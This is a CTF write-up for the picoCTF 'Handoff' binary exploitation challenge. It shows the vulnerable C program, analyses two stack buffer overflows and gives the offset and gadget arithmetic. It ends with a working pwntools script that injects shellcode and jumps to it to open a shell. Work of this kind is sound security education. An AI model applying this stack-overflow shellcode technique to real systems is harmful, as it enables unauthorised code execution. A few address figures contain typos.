# BINARY EXPLOITATION CHALLENGE
---
### Name: Handoff
### Category: Binary Exploitation
### Difficulity: Hard
---

### 1. Examine the ELF file
As usual, I use `pwntools` to check the metadata of file. <br>
<br>
<img width="591" height="187" alt="image" src="https://github.com/user-attachments/assets/d7b3b02d-10d5-4066-bbda-043c2449e3f7" /><br>
<br>
From the image above we can see that there's no protection at all. so it will make our life easier

### 2. Review the code
After we know the metadata of file, it's a right time to review the code to check where is the vulnerability. <br>
<br>
```C
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

#define MAX_ENTRIES 10
#define NAME_LEN 32
#define MSG_LEN 64

typedef struct entry {
	char name[8];
	char msg[64];
} entry_t;

void print_menu() {
	puts("What option would you like to do?");
	puts("1. Add a new recipient");
	puts("2. Send a message to a recipient");
	puts("3. Exit the app");
}

int vuln() {
	char feedback[8];
	entry_t entries[10];
	int total_entries = 0;
	int choice = -1;
	// Have a menu that allows the user to write whatever they want to a set buffer elsewhere in memory
	while (true) {
		print_menu();
		if (scanf("%d", &choice) != 1) exit(0);
		getchar(); // Remove trailing \n

		// Add entry
		if (choice == 1) {
			choice = -1;
			// Check for max entries
			if (total_entries >= MAX_ENTRIES) {
				puts("Max recipients reached!");
				continue;
			}

			// Add a new entry
			puts("What's the new recipient's name: ");
			fflush(stdin);
			fgets(entries[total_entries].name, NAME_LEN, stdin);
			total_entries++;
			
		}
		// Add message
		else if (choice == 2) {
			choice = -1;
			puts("Which recipient would you like to send a message to?");
			if (scanf("%d", &choice) != 1) exit(0);
			getchar();

			if (choice >= total_entries) {
				puts("Invalid entry number");
				continue;
			}

			puts("What message would you like to send them?");
			fgets(entries[choice].msg, MSG_LEN, stdin);
		}
		else if (choice == 3) {
			choice = -1;
			puts("Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it: ");
			fgets(feedback, NAME_LEN, stdin);
			feedback[7] = '\0';
			break;
		}
		else {
			choice = -1;
			puts("Invalid option");
		}
	}
}

int main() {
	setvbuf(stdout, NULL, _IONBF, 0);  // No buffering (immediate output)
	vuln();
	return 0;
}
```
<br>

if we look at the code above, we notice there are `buffer overflow`. First one from the `name` input and second one when we asked to give a `feedback`. <br>
We know the vulnerability is `buffer overflow` but there is no `win` function to get the flag. So we must create ouw own shellcode. Let's do it

### Create the exploitation code
First thing we should know the offset to overwrite the `RIP`. <br>
<br>
<img width="701" height="17" alt="image" src="https://github.com/user-attachments/assets/72a25517-88f8-47f9-b6f3-e50b56121e52" />
<br>
From the image above `rbp-0xc` is the location of `feedback` variable, means the locations is `0xc` from the `RBP` because this is `64-bit` means the `RBP` has 8 byte lenght, so <br> 
<br>
`0xc + 0x8 = 0x14` <br>
<br>
`0x14` was the offset from `feedback` variable to `return address`. so the idea is I will overwrite the `RIP`, instead jumping into the right way, I'll turn into `RAX`, so I will seek the address of `jmp rax` with `ROPgadget`. <br>
<br>
<img width="853" height="61" alt="image" src="https://github.com/user-attachments/assets/d1833591-fc2c-4aab-ad21-91d09dd51bba" /><br>
<br>
Found it! the address of `jmp rax` is `0x000000000040116c`. but soon, I realize, the `fgets` only give me 32 bytes, if we recalculate `20 byte` fo padding and then byte 21 - 28 for the `RIP address` filled with `jmp rax`, moreover there's code `feedback[7] == '\0'`, mean we can't put the shellcode as padding. <br>
so I have another idea, if we jump to the specific address of stack, and then I reseacrh and ask to AI, there's mrthod called `near jump` in short definition basically we do like this `jmp offset`. <br>
so the idea is I put my shellcode in `choice == 2` or when we wanna send a message, because of the lenght is `64 bytes`, and then I seek for the address of variable `message`. <br>
<br>
<img width="782" height="65" alt="image" src="https://github.com/user-attachments/assets/3b00c92f-6d4b-4bf1-b1c0-da5bc3ff6e54" /><br>
<br>
From the image, it's shown that the offset of `message` variable is in `rbp-0x2e0`, and then we will seek the stack address of `RBP`.<br>
<br>
<img width="1467" height="95" alt="image" src="https://github.com/user-attachments/assets/e2643230-bda1-42ac-bcba-1b5d8aaa6382" /><br>
<br>
From the image we know that the address of `RBP` is `0x7fffffffdcf0`.<br>
so because we know that we will `jmp rax` to the `rbp-0xc` we need find the address of `rbp-0xc`.<br>
<br>
`0x7fffffffdcf0 - 0xc = 0x7fffffffdce4` <br>
<br>
Now, we know the address of `rbp-0xc` is `0x7ffffffffce4`, but because the near jump also counted per byte, so it will add by 5. <br>
<br>
`0x7fffffffdce4 + 5 = 0x7fffffffdce9` <br>
<br>
After that we will find the offset from `0x7fffffffdce9` to `rbp-0x2e0` or `0x7ffffffda18`, so we subtract it again. <br>
<br>
`0x7fffffffda18 - 0x7fffffffdce9 = -0x2d1`<br>
<br>
so that's our offset, so we can create the payload. <br>
<br>
```Python
from pwn import *

elf = context.binary = ELF('./handoff')
p = process('./handoff')
io = remote('shape-facility.picoctf.net', 56709)


rax_address = 0x000000000040116c
jmp_rsp_rsp = b"\xe9\x2f\xfd\xff\xff"
shellcode = asm(shellcraft.sh())

payload = b'1\n'
payload += b'fishs\n'
payload += b'2\n'
payload += b'0\n'
payload += shellcode + b'\n'
payload += b'3\n'
payload += jmp_rsp_rsp + b'b' * 15 + p64(rax_address)

io.send(payload)
io.interactive()
```



